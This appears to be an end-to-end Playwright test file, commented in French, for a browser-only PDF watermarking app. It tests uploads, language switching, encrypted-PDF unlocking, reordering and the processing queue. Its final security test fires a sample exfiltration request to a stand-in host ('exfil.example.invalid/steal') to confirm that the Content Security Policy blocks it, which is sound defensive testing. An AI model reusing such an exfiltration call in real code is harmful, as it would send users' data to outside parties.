// Tests de fumée de l'interface (3, volontairement légers) sur l'export
// statique servi tel quel. Les libellés viennent de lib/i18n pour rester
// synchrones avec l'application.
//
// Fichier nommé *.e2e.ts : ignoré par `bun test` (unitaires) ; lancé
// explicitement par `bun run test:e2e`.

import { afterAll, afterEach, beforeAll, describe, expect, test } from "bun:test";
import { join } from "node:path";
import type { Browser, BrowserContext, Page } from "playwright-core";
import { browserName, launchBrowser, MAP_UPSERT_POLYFILL } from "./helpers/browser";
import { E2E_ORIGIN, startServer, type E2eServer } from "./helpers/server";
import { ENCRYPTED_PDF_B64, ENCRYPTED_PDF_PASSWORD, fromBase64, makePdf } from "./helpers/fixtures";
import { STRINGS } from "../lib/i18n";

const OUT_DIR = join(import.meta.dir, "..", "out");

let server: E2eServer;
let browser: Browser;
let context: BrowserContext | undefined;

beforeAll(async () => {
  server = startServer(OUT_DIR);
  browser = await launchBrowser();
});

afterAll(async () => {
  await browser?.close();
  server?.stop();
});

afterEach(async () => {
  // Une page avec des documents chargés pose un garde beforeunload et
  // retient des blob: : Chromium traîne alors à se fermer (la fermeture du
  // navigateur peut bloquer). On vide la page avant de fermer le contexte.
  for (const page of context?.pages() ?? []) {
    await page.goto("about:blank").catch(() => {});
  }
  await context?.close();
  context = undefined;
});

async function openPage(path: string, options?: Parameters<Browser["newContext"]>[0]) {
  // Le service worker est bloqué : il mettrait l'export en cache entre les
  // tests et masquerait le serveur statique.
  context = await browser.newContext({ serviceWorkers: "block", ...options });
  await context.addInitScript(MAP_UPSERT_POLYFILL);
  const page = await context.newPage();
  await page.goto(`${E2E_ORIGIN}${path}`);
  return page;
}

/** Les contrôles d'en-tête existent en double (mobile + desktop) : on ne garde que le visible. */
function visible(page: Page, selector: string) {
  return page.locator(selector).filter({ visible: true }).first();
}

describe("fumée : interface", () => {
  test(
    "déposer un PDF + saisir le texte → statut « prêt » et téléchargement proposé",
    async () => {
      const t = STRINGS.fr;
      const page = await openPage("/fr");

      const pdf = await makePdf([[200, 300]]);
      await page
        .locator(`input[aria-label="${t.inputAria}"]`)
        .setInputFiles({ name: "quittance.pdf", mimeType: "application/pdf", buffer: Buffer.from(pdf) });
      await page.getByLabel(t.purpose.label).fill("Copie réservée au test e2e");

      // L'aperçu attend 500 ms puis pdf.js rend la page : délai large.
      // (pas de @playwright/test ici : les attentes passent par waitFor.)
      await page
        .getByText(t.status.ready, { exact: true })
        .waitFor({ state: "visible", timeout: 30_000 });
      await page.getByRole("button", { name: t.download.one }).and(page.locator(":enabled")).waitFor({ state: "visible" });
    },
    60_000
  );

  test(
    "/en impose l'anglais ; le sélecteur passe en /ja via replaceState, sans navigation",
    async () => {
      const page = await openPage("/en");
      await page.getByText(STRINGS.en.dropTitle).waitFor({ state: "visible" });

      // Témoin : une vraie navigation le ferait disparaître.
      await page.evaluate(() => {
        (window as any).__pasDeNavigation = true;
      });

      await visible(page, `button[aria-label="${STRINGS.en.langMenu}"]`).click();
      await page.getByRole("menuitemradio", { name: /日本語/ }).click();

      await page.getByText(STRINGS.ja.dropTitle).waitFor({ state: "visible" });
      expect(new URL(page.url()).pathname).toBe("/ja");
      expect(await page.evaluate(() => (window as any).__pasDeNavigation)).toBe(true);
    },
    30_000
  );

  test(
    "PDF verrouillé : pastille « protégé », mauvais mot de passe signalé, bon mot de passe → prêt",
    async () => {
      const t = STRINGS.fr;
      const page = await openPage("/fr");

      await page
        .locator(`input[aria-label="${t.inputAria}"]`)
        .setInputFiles({
          name: "verrouille.pdf",
          mimeType: "application/pdf",
          buffer: Buffer.from(fromBase64(ENCRYPTED_PDF_B64)),
        });
      await page.getByLabel(t.purpose.label).fill("Copie réservée au test e2e");

      // Le document verrouillé affiche sa pastille et son champ en ligne.
      await page
        .getByText(t.unlock.locked, { exact: true })
        .waitFor({ state: "visible", timeout: 30_000 });
      const pwInput = page.locator(`input[aria-label="${t.unlock.aria("verrouille.pdf")}"]`);

      // Mauvais mot de passe : message d'erreur, champ toujours là.
      await pwInput.fill("pas-le-bon");
      await page.getByRole("button", { name: t.unlock.button }).click();
      await page
        .getByText(t.errors.pdf_password_wrong)
        .first()
        .waitFor({ state: "visible", timeout: 30_000 });

      // Bon mot de passe : le document passe « prêt », téléchargement proposé.
      await pwInput.fill(ENCRYPTED_PDF_PASSWORD);
      await page.getByRole("button", { name: t.unlock.button }).click();
      await page
        .getByText(t.status.ready, { exact: true })
        .waitFor({ state: "visible", timeout: 30_000 });
      await page.getByRole("button", { name: t.download.one }).and(page.locator(":enabled")).waitFor({ state: "visible" });
    },
    90_000
  );

  // grantPermissions(clipboard-*) n'existe que sur Chromium ; le bouton est
  // couvert par le job Chromium bloquant de la CI, on saute ailleurs.
  test.skipIf(browserName() !== "chromium")(
    "le bouton Partager copie l'URL épinglant la langue",
    async () => {
      const page = await openPage("/en", {
        permissions: ["clipboard-read", "clipboard-write"],
      });
      // Fenêtre desktop (pointer non tactile) : le bouton copie toujours,
      // navigator.share n'est préféré que sur pointeur « coarse ».
      await visible(page, `button[aria-label="${STRINGS.en.share}"]`).click();

      await page.getByText(STRINGS.en.shareCopied).waitFor({ state: "visible" });
      expect(await page.evaluate(() => navigator.clipboard.readText())).toBe(
        `${E2E_ORIGIN}/en`
      );
    },
    30_000
  );
});

describe("réordonner les documents", () => {
  /** Noms des documents, dans l'ordre affiché. */
  const order = (page: Page) =>
    page.locator("li[data-doc-index] button[id^='doc-'] span.truncate").allTextContents();
  /** Attend que l'ordre affiché devienne `expected` (re-rendu React asynchrone). */
  async function orderBecomes(page: Page, expected: string[]) {
    let last: string[] = [];
    for (let i = 0; i < 40; i++) {
      last = await order(page);
      if (JSON.stringify(last) === JSON.stringify(expected)) return;
      await page.waitForTimeout(50);
    }
    expect(last).toEqual(expected);
  }

  test(
    "taper une position déplace le document ; glisser une ligne aussi",
    async () => {
      const t = STRINGS.fr;
      const page = await openPage("/fr");
      const pdf = Buffer.from(await makePdf([[200, 300]]));
      await page.locator(`input[aria-label="${t.inputAria}"]`).setInputFiles(
        ["a.pdf", "b.pdf", "c.pdf"].map((name) => ({ name, mimeType: "application/pdf", buffer: pdf }))
      );
      await page.locator("li[data-doc-index]").nth(2).waitFor();
      expect(await order(page)).toEqual(["a.pdf", "b.pdf", "c.pdf"]);

      // Saisie : « 1 » + Entrée envoie c.pdf en tête.
      const position = page.locator(`input[aria-label="${t.positionOf("c.pdf", 3)}"]`);
      await position.fill("1");
      await position.press("Enter");
      await orderBecomes(page, ["c.pdf", "a.pdf", "b.pdf"]);
      // Hors limites : bornée à la dernière place.
      await page.locator(`input[aria-label="${t.positionOf("c.pdf", 3)}"]`).fill("99");
      await page.locator(`input[aria-label="${t.positionOf("c.pdf", 3)}"]`).press("Enter");
      await orderBecomes(page, ["a.pdf", "b.pdf", "c.pdf"]);

      // Glisser : la poignée de a.pdf lâchée sous la dernière ligne. La liste
      // est d'abord centrée : sous l'en-tête, elle déborde de la fenêtre de
      // 720 px, et un point de lâcher hors écran ne vise aucune ligne (Firefox,
      // WebKit) ; près des bords, le défilement automatique la ferait bouger.
      await page
        .locator("li[data-doc-index]")
        .first()
        .evaluate((li) => li.parentElement!.scrollIntoView({ block: "center" }));
      const handle = page.locator(`button[aria-label="${t.dragHandle("a.pdf")}"]`);
      const from = (await handle.boundingBox())!;
      const last = (await page.locator("li[data-doc-index]").nth(2).boundingBox())!;
      await page.mouse.move(from.x + from.width / 2, from.y + from.height / 2);
      await page.mouse.down();
      await page.mouse.move(from.x + from.width / 2, last.y + last.height * 0.8, { steps: 12 });
      await page.waitForTimeout(100); // une image d'animation : la cible est relue à chaque frame
      await page.mouse.up();
      await orderBecomes(page, ["b.pdf", "c.pdf", "a.pdf"]);

      // Clavier : flèche haut sur la poignée.
      await page.locator(`button[aria-label="${t.dragHandle("a.pdf")}"]`).press("ArrowUp");
      await orderBecomes(page, ["b.pdf", "a.pdf", "c.pdf"]);
    },
    60_000
  );
});

describe("file de traitement", () => {
  test(
    "ajouter un fichier pendant le rendu d'un long PDF ne le fait pas repartir de la page 1",
    async () => {
      const t = STRINGS.fr;
      const page = await openPage("/fr");
      await page.getByLabel(t.purpose.label).fill("Copie e2e");
      const long = Buffer.from(await makePdf(Array.from({ length: 60 }, () => [595, 842] as [number, number])));
      const input = page.locator(`input[aria-label="${t.inputAria}"]`);
      await input.setInputFiles({ name: "long.pdf", mimeType: "application/pdf", buffer: long });

      // Page en cours de long.pdf, lue dans sa pastille de progression.
      const progress = () =>
        page.evaluate(() => {
          const row = [...document.querySelectorAll("li[data-doc-index], li")].find((li) =>
            li.textContent?.includes("long.pdf")
          );
          const m = row?.textContent?.match(/(\d+)\s*\/\s*60/);
          return m ? Number(m[1]) : 0;
        });
      for (let i = 0; i < 200 && (await progress()) < 5; i++) await page.waitForTimeout(50);
      const before = await progress();
      expect(before).toBeGreaterThanOrEqual(5);

      await input.setInputFiles({
        name: "court.pdf",
        mimeType: "application/pdf",
        buffer: Buffer.from(await makePdf([[200, 300]])),
      });
      let lowest = Infinity;
      for (let i = 0; i < 30; i++) {
        const p = await progress();
        if (p > 0) lowest = Math.min(lowest, p);
        await page.waitForTimeout(50);
      }
      expect(lowest).toBeGreaterThanOrEqual(before);
    },
    90_000
  );
});

// Promesse « zéro transfert », vérifiée sous les en-têtes de production
// (le serveur e2e rejoue out/_headers, voir helpers/server.ts).
describe("sécurité : aucun octet ne quitte le navigateur", () => {
  test(
    "un filigrane complet ne contacte que l'origine, sans violation CSP ; une exfiltration est bloquée",
    async () => {
      const t = STRINGS.fr;
      context = await browser.newContext({ serviceWorkers: "block" });
      await context.addInitScript(MAP_UPSERT_POLYFILL);
      await context.addInitScript(() => {
        (window as any).__csp = [];
        document.addEventListener("securitypolicyviolation", (e) =>
          (window as any).__csp.push(`${e.violatedDirective} ${e.blockedURI}`)
        );
      });
      const requests: string[] = [];
      context.on("request", (r) => requests.push(r.url()));
      const page = await context.newPage();
      const response = await page.goto(`${E2E_ORIGIN}/fr`);
      expect(response?.headers()["content-security-policy"]).toContain("connect-src 'self'");

      await page
        .locator(`input[aria-label="${t.inputAria}"]`)
        .setInputFiles({
          name: "confidentiel.pdf",
          mimeType: "application/pdf",
          buffer: Buffer.from(await makePdf([[200, 300]])),
        });
      await page.getByLabel(t.purpose.label).fill("Copie sécurité e2e");
      await page.getByText(t.status.ready, { exact: true }).waitFor({ state: "visible", timeout: 30_000 });

      const offOrigin = requests.filter(
        (u) => !u.startsWith(`${E2E_ORIGIN}/`) && !u.startsWith("blob:") && !u.startsWith("data:")
      );
      expect(offOrigin).toEqual([]);
      expect(await page.evaluate(() => (window as any).__csp)).toEqual([]);

      // Un script injecté qui tenterait d'exfiltrer est arrêté par la CSP.
      const exfil = await page.evaluate(async () => {
        try {
          await fetch("https://exfil.example.invalid/steal", { method: "POST", body: "x" });
          return "envoyé";
        } catch {
          return "bloqué";
        }
      });
      expect(exfil).toBe("bloqué");
      await page.waitForFunction(() => (window as any).__csp.length > 0);
      expect((await page.evaluate(() => (window as any).__csp))[0]).toStartWith("connect-src");
    },
    60_000
  );
});
